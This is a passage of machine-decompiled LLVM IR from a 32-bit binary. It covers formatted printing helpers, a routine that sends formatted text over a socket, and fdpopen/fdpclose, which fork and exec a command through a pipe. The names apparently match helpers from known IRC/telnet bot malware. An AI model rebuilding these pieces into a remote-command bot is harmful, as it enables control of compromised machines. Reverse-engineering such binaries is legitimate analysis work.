  %v4_8048659 = ptrtoint i8* %stack_var_8.1 to i32
  %v2_804865c = load i8, i8* %stack_var_8.1, align 1
  %tmp = icmp ult i8 %v2_804865c, 48
  br i1 %tmp, label %dec_label_pc_804866d, label %dec_label_pc_8048663

dec_label_pc_8048663:                             ; preds = %dec_label_pc_8048659
  %v2_8048666 = load i8, i8* %stack_var_8.1, align 1
  %tmp48 = icmp ult i8 %v2_8048666, 58
  br i1 %tmp48, label %dec_label_pc_8048636, label %dec_label_pc_804866d

dec_label_pc_804866d:                             ; preds = %dec_label_pc_8048663, %dec_label_pc_8048659
  %v2_8048670 = load i8, i8* %stack_var_8.1, align 1
  %v10_8048673 = icmp eq i8 %v2_8048670, 115
  %v1_8048675 = icmp eq i1 %v10_8048673, false
  br i1 %v1_8048675, label %dec_label_pc_80486c4, label %dec_label_pc_8048677

dec_label_pc_8048677:                             ; preds = %dec_label_pc_804866d
  %v1_804867a = add i32 %stack_var_12.142, 4
  %v1_8048682 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048682 = load i32, i32* %v1_8048682, align 4
  %v4_8048687 = icmp eq i32 %v2_8048682, 0
  br i1 %v4_8048687, label %dec_label_pc_804869c, label %dec_label_pc_804868d

dec_label_pc_804868d:                             ; preds = %dec_label_pc_8048677
  %v5_8048690 = inttoptr i32 %v2_8048682 to i8*
  br label %dec_label_pc_804869c

dec_label_pc_804869c:                             ; preds = %dec_label_pc_8048677, %dec_label_pc_804868d
  %storemerge = phi i8* [ %v5_8048690, %dec_label_pc_804868d ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80558cd.12, i32 0, i32 0), %dec_label_pc_8048677 ]
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_80486b7 = call i32 @prints(i32 %tmp6, i8* %storemerge, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_80486bc = add i32 %v6_80486b7, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_80486c4:                             ; preds = %dec_label_pc_804866d
  %v2_80486c7 = load i8, i8* %stack_var_8.1, align 1
  %v10_80486ca = icmp eq i8 %v2_80486c7, 100
  %v1_80486cc = icmp eq i1 %v10_80486ca, false
  br i1 %v1_80486cc, label %dec_label_pc_8048718, label %dec_label_pc_80486ce

dec_label_pc_80486ce:                             ; preds = %dec_label_pc_80486c4
  %v1_80486d1 = add i32 %stack_var_12.142, 4
  %v1_80486d9 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_80486d9 = load i32, i32* %v1_80486d9, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804870b = sext i32 %v2_80486d9 to i64
  %v9_804870b = call i32 @printi(i32 %tmp6, i64 %v8_804870b, i32 10, i32 1, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048710 = add i32 %v9_804870b, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048718:                             ; preds = %dec_label_pc_80486c4
  %v2_804871b = load i8, i8* %stack_var_8.1, align 1
  %v10_804871e = icmp eq i8 %v2_804871b, 120
  %v1_8048720 = icmp eq i1 %v10_804871e, false
  br i1 %v1_8048720, label %dec_label_pc_804876c, label %dec_label_pc_8048722

dec_label_pc_8048722:                             ; preds = %dec_label_pc_8048718
  %v1_8048725 = add i32 %stack_var_12.142, 4
  %v1_804872d = inttoptr i32 %stack_var_12.142 to i32*
  %v2_804872d = load i32, i32* %v1_804872d, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804875f = sext i32 %v2_804872d to i64
  %v9_804875f = call i32 @printi(i32 %tmp6, i64 %v8_804875f, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048764 = add i32 %v9_804875f, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_804876c:                             ; preds = %dec_label_pc_8048718
  %v2_804876f = load i8, i8* %stack_var_8.1, align 1
  %v10_8048772 = icmp eq i8 %v2_804876f, 88
  %v1_8048774 = icmp eq i1 %v10_8048772, false
  br i1 %v1_8048774, label %dec_label_pc_80487c0, label %dec_label_pc_8048776

dec_label_pc_8048776:                             ; preds = %dec_label_pc_804876c
  %v1_8048779 = add i32 %stack_var_12.142, 4
  %v1_8048781 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048781 = load i32, i32* %v1_8048781, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_80487b3 = sext i32 %v2_8048781 to i64
  %v9_80487b3 = call i32 @printi(i32 %tmp6, i64 %v8_80487b3, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 65)
  %v5_80487b8 = add i32 %v9_80487b3, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_80487c0:                             ; preds = %dec_label_pc_804876c
  %v2_80487c3 = load i8, i8* %stack_var_8.1, align 1
  %v10_80487c6 = icmp eq i8 %v2_80487c3, 117
  %v1_80487c8 = icmp eq i1 %v10_80487c6, false
  br i1 %v1_80487c8, label %dec_label_pc_8048811, label %dec_label_pc_80487ca

dec_label_pc_80487ca:                             ; preds = %dec_label_pc_80487c0
  %v1_80487cd = add i32 %stack_var_12.142, 4
  %v1_80487d5 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_80487d5 = load i32, i32* %v1_80487d5, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_8048807 = sext i32 %v2_80487d5 to i64
  %v9_8048807 = call i32 @printi(i32 %tmp6, i64 %v8_8048807, i32 10, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_804880c = add i32 %v9_8048807, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048811:                             ; preds = %dec_label_pc_80487c0
  %v2_8048814 = load i8, i8* %stack_var_8.1, align 1
  %v10_8048817 = icmp eq i8 %v2_8048814, 99
  %v1_8048819 = icmp eq i1 %v10_8048817, false
  br i1 %v1_8048819, label %dec_label_pc_804886f, label %dec_label_pc_804881b

dec_label_pc_804881b:                             ; preds = %dec_label_pc_8048811
  %v1_804881e = add i32 %stack_var_12.142, 4
  %v1_8048826 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048826 = load i32, i32* %v1_8048826, align 4
  store i32 %v2_8048826, i32* %stack_var_-6, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_804884a = call i32 @prints(i32 %tmp6, i8* %tmp21, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_804884f = add i32 %v6_804884a, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048854:                             ; preds = %dec_label_pc_80485ff, %dec_label_pc_80485d3
  %stack_var_8.2 = phi i8* [ %stack_var_8.444, %dec_label_pc_80485d3 ], [ %v22_80485e1, %dec_label_pc_80485ff ]
  %v2_8048857 = load i8, i8* %stack_var_8.2, align 1
  %v3_8048857 = zext i8 %v2_8048857 to i32
  %v4_8048867 = call i32 @printchar(i32* %arg1, i32 %v3_8048857)
  %v4_804886c = add i32 %stack_var_-28.143, 1
  br label %dec_label_pc_804886f

dec_label_pc_804886f:                             ; preds = %dec_label_pc_8048811, %dec_label_pc_804881b, %dec_label_pc_80487ca, %dec_label_pc_8048776, %dec_label_pc_804869c, %dec_label_pc_8048722, %dec_label_pc_80486ce, %dec_label_pc_8048854
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_8048854 ], [ %stack_var_8.1, %dec_label_pc_8048811 ], [ %stack_var_8.1, %dec_label_pc_804881b ], [ %stack_var_8.1, %dec_label_pc_80487ca ], [ %stack_var_8.1, %dec_label_pc_8048776 ], [ %stack_var_8.1, %dec_label_pc_8048722 ], [ %stack_var_8.1, %dec_label_pc_80486ce ], [ %stack_var_8.1, %dec_label_pc_804869c ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.142, %dec_label_pc_8048854 ], [ %stack_var_12.142, %dec_label_pc_8048811 ], [ %v1_804881e, %dec_label_pc_804881b ], [ %v1_80487cd, %dec_label_pc_80487ca ], [ %v1_8048779, %dec_label_pc_8048776 ], [ %v1_8048725, %dec_label_pc_8048722 ], [ %v1_80486d1, %dec_label_pc_80486ce ], [ %v1_804867a, %dec_label_pc_804869c ]
  %stack_var_-28.0 = phi i32 [ %v4_804886c, %dec_label_pc_8048854 ], [ %stack_var_-28.143, %dec_label_pc_8048811 ], [ %v5_804884f, %dec_label_pc_804881b ], [ %v5_804880c, %dec_label_pc_80487ca ], [ %v5_80487b8, %dec_label_pc_8048776 ], [ %v5_8048764, %dec_label_pc_8048722 ], [ %v5_8048710, %dec_label_pc_80486ce ], [ %v5_80486bc, %dec_label_pc_804869c ]
  %v4_804886f = ptrtoint i8* %stack_var_8.3 to i32
  %v5_804886f = add i32 %v4_804886f, 1
  %stack_var_8.4 = inttoptr i32 %v5_804886f to i8*
  %v2_8048875 = load i8, i8* %stack_var_8.4, align 1
  %v4_8048878 = icmp eq i8 %v2_8048875, 0
  %v1_804887a = icmp eq i1 %v4_8048878, false
  br i1 %v1_804887a, label %dec_label_pc_80485d3, label %dec_label_pc_8048880

dec_label_pc_8048880:                             ; preds = %dec_label_pc_804886f, %dec_label_pc_80485e1, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.143, %dec_label_pc_80485e1 ], [ %stack_var_-28.0, %dec_label_pc_804886f ]
  %v4_8048880 = icmp eq i32* %arg1, null
  br i1 %v4_8048880, label %dec_label_pc_804888e, label %dec_label_pc_8048886

dec_label_pc_8048886:                             ; preds = %dec_label_pc_8048880
  %v2_8048889 = load i32, i32* %arg1, align 4
  %v1_804888b = inttoptr i32 %v2_8048889 to i8*
  store i8 0, i8* %v1_804888b, align 1
  br label %dec_label_pc_804888e

dec_label_pc_804888e:                             ; preds = %dec_label_pc_8048880, %dec_label_pc_8048886
  %v2_8048891 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048891, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_804886f, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 10, 11, 8, 9, 6, 7, 4, 5, 2, 3, 1, 0, 12 }
  uselistorder i8* %stack_var_8.1, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 16, 15, 13 }
  uselistorder i32 %v5_8048623, { 1, 0 }
  uselistorder i8* %v22_80485e1, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_8.4.in41, { 1, 0 }
  uselistorder i32 %stack_var_12.142, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %stack_var_-28.143, { 0, 2, 1, 8, 7, 6, 5, 4, 3 }
  uselistorder i32* %stack_var_-6, { 1, 0 }
  uselistorder i32 %tmp6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i64, i32, i32, i32, i32, i32)* @printi, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder i32* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804888e, { 1, 0 }
  uselistorder label %dec_label_pc_804886f, { 7, 1, 0, 2, 3, 5, 6, 4 }
  uselistorder label %dec_label_pc_804869c, { 1, 0 }
  uselistorder label %dec_label_pc_8048659, { 1, 0 }
  uselistorder label %dec_label_pc_8048623, { 1, 0 }
  uselistorder label %dec_label_pc_80485d3, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048893 = load i32, i32* @ebp, align 4
  store i32 %v0_8048893, i32* %stack_var_-4, align 4
  %v4_8048893 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048893, i32* @ebp, align 4
  %v4_804889c = ptrtoint i32* %stack_var_8 to i32
  %v4_80488b4 = call i32 @print(i32* null, i32 %arg1, i32 %v4_804889c)
  %v2_80488b9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80488b9, i32* @ebp, align 4
  ret i32 %v4_80488b4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80488bb = load i32, i32* @ebp, align 4
  store i32 %v0_80488bb, i32* %stack_var_-4, align 4
  %v4_80488bb = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80488bb, i32* @ebp, align 4
  %v4_80488c4 = ptrtoint i32* %stack_var_12 to i32
  %v4_80488db = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_80488c4)
  %v2_80488e0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80488e0, i32* @ebp, align 4
  ret i32 %v4_80488db

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @Rootsprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80488e5 = load i32, i32* @edi, align 4
  store i32 %v0_80488e5, i32* %stack_var_-8, align 4
  %v1_80488f0 = call i32 @malloc(i32 2048)
  store i32 %v1_80488f0, i32* %stack_var_-20, align 4
  %v3_8048911 = inttoptr i32 %v1_80488f0 to i8*
  %v4_8048911 = call i32 @__GI_memset(i8* %v3_8048911, i32 0, i32 2048)
  %v4_804891f = ptrtoint i32* %stack_var_12 to i32
  %v4_8048936 = call i32 @print(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_804891f)
  %v3_804894c = call i32 @_strlen(i8* %v3_8048911)
  %v6_8048953 = add i32 %v1_80488f0, %v3_804894c
  %v1_8048956 = inttoptr i32 %v6_8048953 to i8*
  store i8 10, i8* %v1_8048956, align 1
  store i1 false, i1* @df, align 1
  store i32 %v1_80488f0, i32* @edi, align 4
  %v3_804896a = call i32 @_strlen(i8* %v3_8048911)
  %v4_804898a = call i32 @__libc_send(i32 %arg1, i32 %v1_80488f0, i32 %v3_804896a, i32 16384)
  %v1_8048998 = call i32 @free(i32 %v1_80488f0)
  %v2_80489a3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80489a3, i32* @edi, align 4
  ret i32 %v4_804898a

; uselistorder directives
  uselistorder i32 %v1_80488f0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80489a9 = load i32, i32* @edi, align 4
  store i32 %v0_80489a9, i32* %stack_var_-8, align 4
  %v4_80489ad = ptrtoint i8* %arg2 to i32
  %v2_80489b0 = load i8, i8* %arg2, align 1
  %v10_80489b3 = icmp eq i8 %v2_80489b0, 114
  br i1 %v10_80489b3, label %dec_label_pc_80489c1, label %dec_label_pc_80489b7

dec_label_pc_80489b7:                             ; preds = %entry
  %v2_80489ba = load i8, i8* %arg2, align 1
  %v10_80489bd = icmp eq i8 %v2_80489ba, 119
  %v1_80489bf = icmp eq i1 %v10_80489bd, false
  br i1 %v1_80489bf, label %dec_label_pc_8048b83, label %dec_label_pc_80489c1

dec_label_pc_80489c1:                             ; preds = %dec_label_pc_80489b7, %entry
  %v1_80489c4 = add i32 %v4_80489ad, 1
  %v1_80489c5 = inttoptr i32 %v1_80489c4 to i8*
  %v2_80489c5 = load i8, i8* %v1_80489c5, align 1
  %v4_80489c8 = icmp eq i8 %v2_80489c5, 0
  br i1 %v4_80489c8, label %dec_label_pc_80489d8, label %dec_label_pc_8048b83

dec_label_pc_80489d8:                             ; preds = %dec_label_pc_80489c1
  %v2_80489d8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_80489de = call i32 @__GI_pipe(i32 %v2_80489d8)
  %v2_80489e3 = icmp slt i32 %v2_80489de, 0
  %v1_80489e5 = icmp eq i1 %v2_80489e3, false
  br i1 %v1_80489e5, label %dec_label_pc_80489f3, label %dec_label_pc_8048b83

dec_label_pc_80489f3:                             ; preds = %dec_label_pc_80489d8
  %v0_80489f3 = load i8*, i8** @global_var_805c4e0.13, align 4
  %v2_80489f8 = icmp eq i8* %v0_80489f3, null
  %v1_80489fa = icmp eq i1 %v2_80489f8, false
  br i1 %v1_80489fa, label %bb, label %dec_label_pc_80489fc

dec_label_pc_80489fc:                             ; preds = %dec_label_pc_80489f3
  %v0_80489fc = call i32 @getdtablesize()
  %tmp20 = icmp slt i32 %v0_80489fc, 1
  %tmp21 = icmp eq i1 %tmp20, false
  br i1 %tmp21, label %dec_label_pc_8048a16, label %dec_label_pc_8048b83

dec_label_pc_8048a16:                             ; preds = %dec_label_pc_80489fc
  %v2_8048a19 = mul i32 %v0_80489fc, 4
  %v2_8048a1f = call i32 @malloc(i32 %v2_8048a19)
  %v1_8048a24 = inttoptr i32 %v2_8048a1f to i8*
  store i8* %v1_8048a24, i8** @global_var_805c4e0.13, align 32
  %v2_8048a2e = icmp eq i32 %v2_8048a1f, 0
  %v1_8048a30 = icmp eq i1 %v2_8048a2e, false
  br i1 %v1_8048a30, label %dec_label_pc_8048a3e, label %dec_label_pc_8048b83

dec_label_pc_8048a3e:                             ; preds = %dec_label_pc_8048a16
  %v1_8048a41 = mul i32 %v0_80489fc, 4
  store i32 %v2_8048a1f, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048a52 = and i32 %v2_8048a1f, -256
  %v5_8048a54 = call i8* @_memset(i8* %v1_8048a24, i32 %v1_8048a52, i32 %v1_8048a41)
  br label %bb

bb:                                               ; preds = %dec_label_pc_80489f3, %dec_label_pc_8048a3e
  %v0_8048a56 = call i32 @__vfork()
  %v13_8048a64 = icmp eq i32 %v0_8048a56, -1
  br i1 %v13_8048a64, label %dec_label_pc_8048a75, label %dec_label_pc_8048a6a

dec_label_pc_8048a6a:                             ; preds = %bb
  %v4_8048a6a = icmp eq i32 %v0_8048a56, 0
  %v2_8048a9a = load i8, i8* %arg2, align 1
  %v10_8048a9d = icmp eq i8 %v2_8048a9a, 114
  %v1_8048a9f = icmp eq i1 %v10_8048a9d, false
  br i1 %v4_8048a6a, label %dec_label_pc_8048a97, label %dec_label_pc_8048b3b

dec_label_pc_8048a75:                             ; preds = %bb
  %v3_8048a75 = load i32, i32* %stack_var_-24, align 4
  %v2_8048a7b = call i32 @__libc_close(i32 %v3_8048a75)
  %v2_8048a86 = call i32 @__libc_close(i32 %tmp8)
  br label %dec_label_pc_8048b83

dec_label_pc_8048a97:                             ; preds = %dec_label_pc_8048a6a
  br i1 %v1_8048a9f, label %dec_label_pc_8048ad4, label %dec_label_pc_8048aa1

dec_label_pc_8048aa1:                             ; preds = %dec_label_pc_8048a97
  %v9_8048aa4 = icmp eq i32 %tmp8, 1
  br i1 %v9_8048aa4, label %dec_label_pc_8048ac7, label %dec_label_pc_8048aa9

dec_label_pc_8048aa9:                             ; preds = %dec_label_pc_8048aa1
  %v4_8048ab7 = call i32 @dup2(i32 %tmp8, i32 1)
  %v2_8048ac2 = call i32 @__libc_close(i32 %tmp8)
  br label %dec_label_pc_8048ac7

dec_label_pc_8048ac7:                             ; preds = %dec_label_pc_8048aa1, %dec_label_pc_8048aa9
  %v3_8048ac7 = load i32, i32* %stack_var_-24, align 4
  %v2_8048acd = call i32 @__libc_close(i32 %v3_8048ac7)
  br label %dec_label_pc_8048b04

dec_label_pc_8048ad4:                             ; preds = %dec_label_pc_8048a97
  %v3_8048ad4 = load i32, i32* %stack_var_-24, align 4
  %v1_8048ad7 = icmp eq i32 %v3_8048ad4, 0
  br i1 %v1_8048ad7, label %dec_label_pc_8048af9, label %dec_label_pc_8048adb

dec_label_pc_8048adb:                             ; preds = %dec_label_pc_8048ad4
  %v4_8048ae9 = call i32 @dup2(i32 %v3_8048ad4, i32 0)
  %v3_8048aee = load i32, i32* %stack_var_-24, align 4
  %v2_8048af4 = call i32 @__libc_close(i32 %v3_8048aee)
  br label %dec_label_pc_8048af9

dec_label_pc_8048af9:                             ; preds = %dec_label_pc_8048ad4, %dec_label_pc_8048adb
  %v2_8048aff = call i32 @__libc_close(i32 %tmp8)
  br label %dec_label_pc_8048b04

dec_label_pc_8048b04:                             ; preds = %dec_label_pc_8048ac7, %dec_label_pc_8048af9
  %v8_8048b2a = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_80558da.16 to i32), i32 ptrtoint ([3 x i8]* @global_var_80558d7.15 to i32), i32 ptrtoint ([3 x i8]* @global_var_80558d4.14 to i32), i32 %arg1, i32 0)
  %v2_8048b36 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8048b3b:                             ; preds = %dec_label_pc_8048a6a
  br i1 %v1_8048a9f, label %dec_label_pc_8048b58, label %dec_label_pc_8048b45

dec_label_pc_8048b45:                             ; preds = %dec_label_pc_8048b3b
  %v3_8048b45 = load i32, i32* %stack_var_-24, align 4
  %v2_8048b51 = call i32 @__libc_close(i32 %tmp8)
  br label %dec_label_pc_8048b69

dec_label_pc_8048b58:                             ; preds = %dec_label_pc_8048b3b
  %v3_8048b5e = load i32, i32* %stack_var_-24, align 4
  %v2_8048b64 = call i32 @__libc_close(i32 %v3_8048b5e)
  br label %dec_label_pc_8048b69

dec_label_pc_8048b69:                             ; preds = %dec_label_pc_8048b45, %dec_label_pc_8048b58
  %stack_var_-28.0 = phi i32 [ %tmp8, %dec_label_pc_8048b58 ], [ %v3_8048b45, %dec_label_pc_8048b45 ]
  %v2_8048b6c = mul i32 %stack_var_-28.0, 4
  %v0_8048b71 = load i8*, i8** @global_var_805c4e0.13, align 4
  %v1_8048b71 = ptrtoint i8* %v0_8048b71 to i32
  %v2_8048b76 = add i32 %v1_8048b71, %v2_8048b6c
  %v2_8048b7b = inttoptr i32 %v2_8048b76 to i32*
  store i32 %v0_8048a56, i32* %v2_8048b7b, align 4
  br label %dec_label_pc_8048b83

dec_label_pc_8048b83:                             ; preds = %dec_label_pc_8048a16, %dec_label_pc_80489fc, %dec_label_pc_80489d8, %dec_label_pc_80489b7, %dec_label_pc_80489c1, %dec_label_pc_8048a75, %dec_label_pc_8048b69
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_8048a75 ], [ %stack_var_-28.0, %dec_label_pc_8048b69 ], [ -1, %dec_label_pc_80489c1 ], [ -1, %dec_label_pc_80489b7 ], [ -1, %dec_label_pc_80489d8 ], [ -1, %dec_label_pc_80489fc ], [ -1, %dec_label_pc_8048a16 ]
  %v2_8048b89 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048b89, i32* @edi, align 4
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v0_8048a56, { 1, 2, 0 }
  uselistorder i32 %v0_80489fc, { 2, 0, 1 }
  uselistorder i32 %tmp8, { 1, 6, 5, 4, 3, 0, 2 }
  uselistorder i8* %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048b83, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048b69, { 1, 0 }
  uselistorder label %dec_label_pc_8048b04, { 1, 0 }
  uselistorder label %dec_label_pc_8048af9, { 1, 0 }
  uselistorder label %dec_label_pc_8048ac7, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048b8c = load i32, i32* @ebp, align 4
  store i32 %v0_8048b8c, i32* %stack_var_-4, align 4
  %v0_8048b95 = load i8*, i8** @global_var_805c4e0.13, align 4
  %v2_8048b9a = icmp eq i8* %v0_8048b95, null
  br i1 %v2_8048b9a, label %dec_label_pc_8048cf9, label %dec_label_pc_8048b9e

dec_label_pc_8048b9e:                             ; preds = %entry
  %v1_8048b95 = ptrtoint i8* %v0_8048b95 to i32
  %v2_8048ba1 = mul i32 %arg1, 4
  %v2_8048bab = add i32 %v1_8048b95, %v2_8048ba1
  %v1_8048bae = inttoptr i32 %v2_8048bab to i32*
  %v2_8048bae = load i32, i32* %v1_8048bae, align 4
  %v1_8048bb0 = icmp eq i32 %v2_8048bae, 0
  %v1_8048bb2 = icmp eq i1 %v1_8048bb0, false
  br i1 %v1_8048bb2, label %dec_label_pc_8048bc3, label %dec_label_pc_8048cf9

dec_label_pc_8048bc3:                             ; preds = %dec_label_pc_8048b9e
  %v1_8048bc9 = call i32 @__libc_close(i32 %arg1)
  %v2_8048bce = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048bd7 = call i32 @sigemptyset(i32 %v2_8048bce)
  %v2_8048bed = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 2)
  %v2_8048c03 = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 3)
  %v2_8048c19 = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 1)
  %v4_8048c24 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048c39 = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048c39 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048c39, i32 %v4_8048c24)
  %v2_8048c58 = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048c3e

dec_label_pc_8048c3e:                             ; preds = %dec_label_pc_8048c79, %dec_label_pc_8048bc3
  %v0_8048c46 = load i8*, i8** @global_var_805c4e0.13, align 4
  %v1_8048c46 = ptrtoint i8* %v0_8048c46 to i32
  %v2_8048c4b = add i32 %v1_8048c46, %v2_8048ba1
  %v1_8048c4e = inttoptr i32 %v2_8048c4b to i32*
  %v2_8048c4e = load i32, i32* %v1_8048c4e, align 4
  %v3_8048c65 = call i32 @__libc_waitpid(i32 %v2_8048c4e, i32 %v2_8048c58, i32 0)
  %v13_8048c70 = icmp eq i32 %v3_8048c65, -1
  %v1_8048c77 = icmp eq i1 %v13_8048c70, false
  br i1 %v1_8048c77, label %dec_label_pc_8048c85, label %dec_label_pc_8048c79

dec_label_pc_8048c79:                             ; preds = %dec_label_pc_8048c3e
  %v1_8048c79 = call i32 @__errno_location(i32 %v3_8048c65)
  %v1_8048c7e = inttoptr i32 %v1_8048c79 to i32*
  %v2_8048c7e = load i32, i32* %v1_8048c7e, align 4
  %v9_8048c80 = icmp eq i32 %v2_8048c7e, 4
  br i1 %v9_8048c80, label %dec_label_pc_8048c3e, label %dec_label_pc_8048c85

dec_label_pc_8048c85:                             ; preds = %dec_label_pc_8048c79, %dec_label_pc_8048c3e
  %v13_8048c70.lcssa = phi i1 [ true, %dec_label_pc_8048c79 ], [ false, %dec_label_pc_8048c3e ]
  %v3_8048c9e = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048c9e = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048c9e, i32 0)
  %v2_8048ca9 = mul i32 %tmp6, 4
  %v0_8048cae = load i8*, i8** @global_var_805c4e0.13, align 4
  %v1_8048cae = ptrtoint i8* %v0_8048cae to i32
  %v2_8048cb3 = add i32 %v1_8048cae, %v2_8048ca9
  %v1_8048cb6 = inttoptr i32 %v2_8048cb3 to i32*
  store i32 0, i32* %v1_8048cb6, align 4
  br i1 %v13_8048c70.lcssa, label %dec_label_pc_8048ced, label %dec_label_pc_8048cc5

dec_label_pc_8048cc5:                             ; preds = %dec_label_pc_8048c85
  %v3_8048cc5 = load i32, i32* %stack_var_-268, align 4
  %v1_8048cd1 = and i32 %v3_8048cc5, 65280
  %v2_8048cd81 = udiv i32 %v1_8048cd1, 256
  br label %dec_label_pc_8048ced

dec_label_pc_8048ced:                             ; preds = %dec_label_pc_8048c85, %dec_label_pc_8048cc5
  %storemerge2 = phi i32 [ %v2_8048cd81, %dec_label_pc_8048cc5 ], [ -1, %dec_label_pc_8048c85 ]
  %v2_8048cff.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048cf9

dec_label_pc_8048cf9:                             ; preds = %entry, %dec_label_pc_8048b9e, %dec_label_pc_8048ced
  %v2_8048cff = phi i32 [ %v2_8048cff.pre, %dec_label_pc_8048ced ], [ %v0_8048b8c, %dec_label_pc_8048b9e ], [ %v0_8048b8c, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048ced ], [ -1, %dec_label_pc_8048b9e ], [ -1, %entry ]
  store i32 %v2_8048cff, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048c65, { 1, 0 }
  uselistorder i32 %v2_8048ba1, { 1, 0 }
  uselistorder i8* %v0_8048b95, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i8** @global_var_805c4e0.13, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048cf9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048ced, { 1, 0 }
}

